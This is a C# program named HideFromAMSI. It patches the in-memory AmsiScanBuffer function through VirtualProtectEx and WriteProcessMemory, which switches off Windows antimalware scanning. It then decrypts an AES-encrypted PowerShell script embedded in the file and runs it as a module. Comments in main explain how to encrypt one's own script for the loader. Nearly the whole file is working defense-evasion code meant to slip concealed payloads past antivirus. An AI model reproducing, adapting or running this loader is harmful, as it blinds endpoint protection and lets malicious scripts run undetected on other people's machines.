using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.IO;
using System.Security.Cryptography;

namespace HideFromAMSI
{
    class Program
    {
        public static string EncryptedPs1Script = "The encrypted script from the enc.txt you create in the main function"; //Use the Encrypt(string plainText) to get the encrypted ps1 script.

        static readonly string PasswordHash = "OyC@P@@Sw0rd";
        static readonly string SaltKey = "OyC@S@LT&KEY";
        static readonly string VIKey = "OyC@1B2c3D4e5F6g7H8";

        //https://social.msdn.microsoft.com/Forums/vstudio/en-US/d6a2836a-d587-4068-8630-94f4fb2a2aeb/encrypt-and-decrypt-a-string-in-c?forum=csharpgeneral
        public static string Encrypt(string plainText)
        {
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            byte[] keyBytes = new Rfc2898DeriveBytes(PasswordHash, Encoding.ASCII.GetBytes(SaltKey)).GetBytes(256 / 8);
            var symmetricKey = new RijndaelManaged() { Mode = CipherMode.CBC, Padding = PaddingMode.Zeros };
            var encryptor = symmetricKey.CreateEncryptor(keyBytes, Encoding.ASCII.GetBytes(VIKey));

            byte[] cipherTextBytes;

            using (var memoryStream = new MemoryStream())
            {
                using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                    cryptoStream.FlushFinalBlock();
                    cipherTextBytes = memoryStream.ToArray();
                    cryptoStream.Close();
                }
                memoryStream.Close();
            }
            return Convert.ToBase64String(cipherTextBytes);
        }

        public static string Decrypt(string encryptedText)
        {
            byte[] cipherTextBytes = Convert.FromBase64String(encryptedText);
            byte[] keyBytes = new Rfc2898DeriveBytes(PasswordHash, Encoding.ASCII.GetBytes(SaltKey)).GetBytes(256 / 8);
            var symmetricKey = new RijndaelManaged() { Mode = CipherMode.CBC, Padding = PaddingMode.None };

            var decryptor = symmetricKey.CreateDecryptor(keyBytes, Encoding.ASCII.GetBytes(VIKey));
            var memoryStream = new MemoryStream(cipherTextBytes);
            var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);
            byte[] plainTextBytes = new byte[cipherTextBytes.Length];

            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount).TrimEnd("\0".ToCharArray());
        }

        // Signatures from https://pinvoke.net/
        static class NativeMethods
        {
            [DllImport("kernel32.dll")]
            public static extern uint GetLastError();

            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string dllToLoad);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

            [DllImport("kernel32.dll")]
            public static extern bool FreeLibrary(IntPtr hModule);

            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            public enum Protection : uint
            {
                PAGE_NOACCESS = 0x01,
                PAGE_READONLY = 0x02,
                PAGE_READWRITE = 0x04,
                PAGE_WRITECOPY = 0x08,
                PAGE_EXECUTE = 0x10,
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
                PAGE_EXECUTE_WRITECOPY = 0x80,
                PAGE_GUARD = 0x100,
                PAGE_NOCACHE = 0x200,
                PAGE_WRITECOMBINE = 0x400
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();
        }

        static string HookAmsiScanBuffer(IntPtr hProcess)
        {
            IntPtr dllHandle = NativeMethods.LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null) return "LoadLibrary error " + NativeMethods.GetLastError();

            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = NativeMethods.GetProcAddress(dllHandle, "AmsiScanBuffer");
            if (AmsiScanbufferAddr == null) return "GetProcAddress error " + NativeMethods.GetLastError();


            //uint OldProtection = (uint)Marshal.AllocHGlobal(8); //pointer to store the current AmsiScanBuffer memory protection
            uint OldProtection;

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = NativeMethods.VirtualProtectEx(hProcess, AmsiScanbufferAddr, (UIntPtr)0x0015,
                (uint)NativeMethods.Protection.PAGE_EXECUTE_READWRITE, out OldProtection);
            if (VirtualProtectRc == false) return "VirtualProtectEx error [change protection] " + NativeMethods.GetLastError();

            //The new patch opcode
            var patch = new byte[] { 0x31, 0xff, 0x90 };

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            //IntPtr unmanagedPointer = Marshal.AllocHGlobal(3); // For MoveMemory
            //Marshal.Copy(patch, 0, unmanagedPointer, 3);       // For MoveMemory

            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
            //NativeMethods.MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
            IntPtr lpNumberOfBytesWritten;
            NativeMethods.WriteProcessMemory(hProcess, AmsiScanbufferAddr + 0x001b, patch, 3, out lpNumberOfBytesWritten);
            if (3 != (long)lpNumberOfBytesWritten) return "WriteProcessMemory error " + NativeMethods.GetLastError();

            //Pointer changing the AmsiScanBuffer memory protection back to readable only
            VirtualProtectRc = NativeMethods.VirtualProtectEx(hProcess, AmsiScanbufferAddr, (UIntPtr)0x0015,
                OldProtection, out OldProtection);
            if (VirtualProtectRc == false) return "VirtualProtectEx error [restore protection] " + NativeMethods.GetLastError();

            return "AmsiScanBuffer hooked successfully";
        }

        static void InvokePowerShell(PowerShell PowerShellInstance)
        {
            // invoke execution on the pipeline (collecting output)
            Collection<PSObject> PSOutput = PowerShellInstance.Invoke();

            if (PowerShellInstance.Streams.Error.Count > 0)
            {
                foreach (ErrorRecord ErrorItem in PowerShellInstance.Streams.Error)
                {
                    if (ErrorItem != null)
                    {
                        Console.WriteLine(ErrorItem.ToString());
                    }
                }
            }

            // loop through each output object item
            foreach (PSObject outputItem in PSOutput)
            {
                if (outputItem != null)
                {
                    Console.WriteLine(outputItem.BaseObject.GetType().FullName);
                    Console.WriteLine(outputItem.BaseObject.ToString() + "\n");
                }
            }
        }

        static void RunAutomationPowerShell()
        {
            using (PowerShell PowerShellInstance = PowerShell.Create())
            {
                Console.Out.WriteLine(HookAmsiScanBuffer(NativeMethods.GetCurrentProcess()));

                string DecryptedPs1Script = Encoding.UTF8.GetString(Convert.FromBase64String(Decrypt(EncryptedPs1Script))); // Could be Unicode instead of UTF8 [Encoding.UTF8. => Encoding.Unicode.]
                RunspaceInvoke invoke = new RunspaceInvoke();
                ScriptBlock Ps1ScriptBlock = invoke.Invoke(DecryptedPs1Script)[0].BaseObject as ScriptBlock;

                // Load the module
                PowerShellInstance.AddCommand("New-Module");
                PowerShellInstance.AddParameter("ScriptBlock", Ps1ScriptBlock);
                InvokePowerShell(PowerShellInstance);

                // Use it
                PowerShellInstance.AddCommand("Invoke-Something").AddParameter("Some-Parameter");
                InvokePowerShell(PowerShellInstance);
            }
        }

        static void Main(string[] args)
        {
            /*
             * 1. Encrypt your script. (The script should be encoded to Base64 to avoid problems)
             *    This code will save a file "enc.txt" in the same folder as the executable, copy it's content 
             *    and place it as the global EncryptedPs1Script string value
             *    (public static string EncryptedPs1Script = "The encrypted script";).
             */
            /*string EncryptedScript = Encrypt("The Base64 of the script");
            using (System.IO.StreamWriter file =
                    new System.IO.StreamWriter("enc.txt", false))
            {
                file.WriteLine(EncryptedScript);
            }*/

            RunAutomationPowerShell();
            // NativeMethods.GetModuleHandle(null); -> NOT WORKING - WHY?
        }
    }
}
